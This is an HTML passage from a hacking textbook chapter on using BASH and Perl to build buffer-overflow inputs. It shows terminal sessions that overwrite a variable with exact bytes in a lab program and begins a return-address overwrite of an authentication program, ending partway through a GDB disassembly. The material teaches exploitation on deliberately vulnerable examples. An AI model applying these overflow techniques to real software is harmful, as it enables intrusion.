<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x330 Experimenting with BASH</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part55.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part57.htm">Next &gt;</a></p><p class="s30" style="padding-left: 37pt;text-indent: 0pt;text-align: left;"><a name="bookmark46">0x330 Experimenting with BASH</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Since so much of hacking is rooted in exploitation and experimentation, the ability to quickly try different things is vital. The BASH shell and Perl are common on most machines and are all that is needed to experiment with exploitation.</p><p style="padding-left: 91pt;text-indent: 17pt;text-align: justify;"><span class="s27">Perl </span>is an interpreted programming language with a <span class="s31">print </span>command that happens to be particularly suited to generating long sequences of characters. Perl can be used to execute instructions on the command line by using the</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: justify;">-e <span class="p">switch like this:</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_371.png"/></span></p><p class="s31" style="padding-top: 1pt;padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ perl -e &#39;print &quot;A&quot; x 20;&#39; AAAAAAAAAAAAAAAAAAAA</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_372.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">This command tells Perl to execute the commands found between the single quotes—in this case, a single command of <span class="s31">print &quot;A&quot; x 20;</span>. This com- mand prints the character <span class="s27">A </span>20 times.</p><p style="padding-left: 109pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Any character, such as a nonprintable character, can also be printed by</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;">using <span class="s31">\x##</span>, where <span class="s33">## </span>is the hexadecimal value of the character. In the following example, this notation is used to print the character <span class="s27">A</span>, which has the hexa- decimal value of <span class="s31">0x41</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_373.png"/></span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ perl -e &#39;print &quot;\x41&quot; x 20;&#39; AAAAAAAAAAAAAAAAAAAA</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_374.png"/></span></p><p style="padding-top: 8pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">In addition, string concatenation can be done in Perl with a period (<span class="s31">.</span>).</p><p style="padding-left: 28pt;text-indent: 0pt;text-align: center;">This can be useful when stringing multiple addresses together.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_375.png"/></span></p><p class="s31" style="padding-top: 1pt;padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ perl -e &#39;print &quot;A&quot;x20 . &quot;BCD&quot; . &quot;\x61\x66\x67\x69&quot;x2 . &quot;Z&quot;;&#39; AAAAAAAAAAAAAAAAAAAABCDafgiafgiZ</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_376.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">An entire shell command can be executed like a function, returning its output in place. This is done by surrounding the command with parentheses and prefixing a dollar sign. Here are two examples:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_377.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ $(perl -e &#39;print &quot;uname&quot;;&#39;)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Linux</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ una$(perl -e &#39;print &quot;m&quot;;&#39;)e Linux</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_378.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">In each case, the output of the command found between the parentheses is substituted for the command, and the command <span class="s31">uname </span>is executed. This exact command-substitution effect can be accomplished with grave accent marks (<span class="s31">`</span>, the tilted single quote on the tilde key). You can use whichever syntax feels more natural for you; however, the parentheses syntax is easier to read for most people.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_379.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ u`perl -e &#39;print &quot;na&quot;;&#39;`me Linux</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ u$(perl -e &#39;print &quot;na&quot;;&#39;)me Linux</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_380.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Command substitution and Perl can be used in combination to quickly generate overflow buffers on the fly. You can use this technique to easily test the overflow_example.c program with buffers of precise lengths.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_381.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./overflow_example $(perl -e &#39;print &quot;A&quot;x30&#39;) [BEFORE] buffer_two is at 0xbffff7e0 and contains &#39;two&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[BEFORE] buffer_one is at 0xbffff7e8 and contains &#39;one&#39; [BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[STRCPY] copying 30 bytes into buffer_two</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[AFTER] buffer_two is at 0xbffff7e0 and contains &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; [AFTER] buffer_one is at 0xbffff7e8 and contains &#39;AAAAAAAAAAAAAAAAAAAAAA&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141) Segmentation fault (core dumped)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gdb -q (gdb) print 0xbffff7f4 - 0xbffff7e0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 20</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) quit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./overflow_example $(perl -e &#39;print &quot;A&quot;x20 . &quot;ABCD&quot;&#39;) [BEFORE] buffer_two is at 0xbffff7e0 and contains &#39;two&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[BEFORE] buffer_one is at 0xbffff7e8 and contains &#39;one&#39; [BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[STRCPY] copying 24 bytes into buffer_two</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">[AFTER] buffer_two is at 0xbffff7e0 and contains &#39;AAAAAAAAAAAAAAAAAAAAABCD&#39; [AFTER] buffer_one is at 0xbffff7e8 and contains &#39;AAAAAAAAAAAAABCD&#39; [AFTER] value is at 0xbffff7f4 and is 1145258561 (0x44434241) reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_382.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 106%;text-align: left;">In the output above, GDB is used as a hexadecimal calculator to figure out the distance between <span class="s31">buffer_two </span>(<span class="s31">0xbfffff7e0</span>) and the <span class="s31">value </span>variable (<span class="s31">0xbffff7f4</span>), which turns out to be 20 bytes. Using this distance, the <span class="s31">value </span>variable is overwritten with the exact value <span class="s31">0x44434241</span>, since the characters <span class="s27">A</span>, <span class="s27">B</span>, <span class="s27">C</span>, and <span class="s27">D </span>have the hex values of <span class="s31">0x41</span>, <span class="s31">0x42</span>, <span class="s31">0x43</span>, and <span class="s31">0x44</span>, respectively. The first character is the least significant byte, due to the little-endian architec- ture. This means if you wanted to control the value variable with something exact, like <span class="s31">0xdeadbeef</span>, you must write those bytes into memory in reverse order.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_383.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./overflow_example $(perl -e &#39;print &quot;A&quot;x20 . &quot;\xef\xbe\xad\xde&quot;&#39;) [BEFORE] buffer_two is at 0xbffff7e0 and contains &#39;two&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[BEFORE] buffer_one is at 0xbffff7e8 and contains &#39;one&#39; [BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[STRCPY] copying 24 bytes into buffer_two</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[AFTER] buffer_two is at 0xbffff7e0 and contains &#39;AAAAAAAAAAAAAAAAAAAA??&#39; [AFTER] buffer_one is at 0xbffff7e8 and contains &#39;AAAAAAAAAAAA??&#39;</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">[AFTER] value is at 0xbffff7f4 and is -559038737 (0xdeadbeef) reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_384.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This technique can be applied to overwrite the return address in the auth_overflow2.c program with an exact value. In the example below, we will overwrite the return address with a different address in <span class="s31">main()</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_385.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g -o auth_overflow2 auth_overflow2.c reader@hacking:~/booksrc $ gdb -q ./auth_overflow2</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) disass main</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Dump of assembler code for function main:</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048474 &lt;main+0&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">push</p></td><td style="width:102pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ebp</p></td></tr><tr style="height:11pt"><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x08048475 &lt;main+1&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:102pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ebp,esp</p></td></tr><tr style="height:11pt"><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048477 &lt;main+3&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">sub</p></td><td style="width:102pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">esp,0x8</p></td></tr><tr style="height:11pt"><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x0804847a &lt;main+6&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">and</p></td><td style="width:102pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">esp,0xfffffff0</p></td></tr><tr style="height:11pt"><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x0804847d &lt;main+9&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:102pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">eax,0x0</p></td></tr><tr style="height:11pt"><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x08048482 &lt;main+14&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sub</p></td><td style="width:102pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">esp,eax</p></td></tr><tr style="height:11pt"><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048484 &lt;main+16&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">cmp</p></td><td style="width:102pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [ebp+8],0x1</p></td></tr><tr style="height:11pt"><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048488 &lt;main+20&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">jg</p></td><td style="width:102pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x80484ab &lt;main+55&gt;</p></td></tr><tr style="height:10pt"><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x0804848a &lt;main+22&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:102pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">eax,DWORD PTR [ebp+12]</p></td></tr></table><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x0804848d</p></td><td style="width:53pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+25&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:45pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">eax,DWORD</p></td><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">PTR [eax]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x0804848f</p></td><td style="width:53pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+27&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:45pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">DWORD PTR</p></td><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[esp+4],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048493</p></td><td style="width:53pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+31&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:45pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">DWORD PTR</p></td><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[esp],0x80485e5</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x0804849a</p></td><td style="width:53pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+38&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">call</p></td><td style="width:45pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x804831c</p></td><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;printf@plt&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x0804849f</p></td><td style="width:53pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+43&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:45pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">DWORD PTR</p></td><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[esp],0x0</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484a6</p></td><td style="width:53pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+50&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">call</p></td><td style="width:45pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x804833c</p></td><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;exit@plt&gt;</p></td></tr><tr style="height:32pt"><td style="width:47pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 107%;text-align: left;">0x080484ab 0x080484ae</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x080484b1</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+55&gt;:</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">&lt;main+58&gt;:</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+61&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;padding-right: 12pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov add</p><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:45pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 107%;text-align: left;">eax,DWORD eax,0x4</p><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">eax,DWORD</p></td><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PTR [ebp+12]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PTR [eax]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484b3</p></td><td style="width:53pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+63&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:45pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">DWORD PTR</p></td><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[esp],eax</p></td></tr><tr style="height:32pt"><td style="width:47pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 107%;text-align: left;">0x080484b6 0x080484bb</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x080484bd</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+66&gt;:</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">&lt;main+71&gt;:</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+73&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;padding-right: 8pt;text-indent: 0pt;line-height: 107%;text-align: left;">call test</p><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">je</p></td><td style="width:45pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x8048414</p><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 11pt;text-align: left;">eax,eax 0x80484e5</p></td><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;check_authentication&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+113&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484bf</p></td><td style="width:53pt"><p class="s45" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+75&gt;:</p></td><td style="width:30pt"><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:45pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">DWORD PTR</p></td><td style="width:98pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[esp],0x80485fb</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x080484c6</p></td><td style="width:53pt"><p class="s45" style="padding-right: 6pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+82&gt;:</p></td><td style="width:30pt"><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">call</p></td><td style="width:45pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x804831c</p></td><td style="width:98pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;printf@plt&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x080484cb</p></td><td style="width:53pt"><p class="s45" style="padding-right: 6pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+87&gt;:</p></td><td style="width:30pt"><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:45pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">DWORD PTR</p></td><td style="width:98pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[esp],0x8048619</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484d2</p></td><td style="width:53pt"><p class="s45" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+94&gt;:</p></td><td style="width:30pt"><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">call</p></td><td style="width:45pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x804831c</p></td><td style="width:98pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;printf@plt&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484d7</p></td><td style="width:53pt"><p class="s45" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+99&gt;:</p></td><td style="width:30pt"><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:45pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">DWORD PTR</p></td><td style="width:98pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[esp],0x8048630</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x080484de</p></td><td style="width:53pt"><p class="s45" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+106&gt;:</p></td><td style="width:30pt"><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">call</p></td><td style="width:45pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x804831c</p></td><td style="width:98pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;printf@plt&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x080484e3</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+111&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">jmp</p></td><td style="width:45pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x80484f1</p></td><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+125&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484e5</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+113&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:45pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">DWORD PTR</p></td><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: 